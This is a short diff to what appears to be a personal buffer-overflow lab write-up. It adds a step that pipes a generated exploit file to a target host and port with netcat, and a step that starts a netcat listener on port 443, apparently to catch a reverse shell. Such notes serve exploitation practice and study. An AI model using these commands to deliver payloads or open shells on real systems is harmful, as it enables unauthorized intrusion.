@@ -34,6 +34,10 @@ This Rep describes my steps for BoF.
                 f = open("/home/kali/Downloads/exploit.txt", "wb")
                 f.write(buf)
                 f.close()
+ 10. send to server: 
+ cat exploit.txt - | nc 192.168.221.52 5000
+and set nc listner: nc -nvlp 443
+
 
 
 
